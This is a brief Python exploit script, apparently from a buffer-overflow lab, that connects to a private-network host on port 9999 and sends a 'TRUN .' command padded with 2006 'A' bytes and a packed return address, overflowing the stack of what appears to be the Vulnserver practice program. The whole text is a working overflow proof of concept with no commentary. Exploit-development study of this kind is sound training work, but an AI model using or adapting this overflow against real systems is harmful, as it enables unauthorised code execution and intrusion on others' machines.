from socket import *
import struct

host = "192.168.1.38"
port = 9999
s = socket(AF_INET,SOCK_STREAM)
s.connect((host,port))
ad = struct.pack("I",0x76792273)
buf = 'A' * 2006
buf += ad 


s.send("TRUN ."+buf)
s.recv(1024)
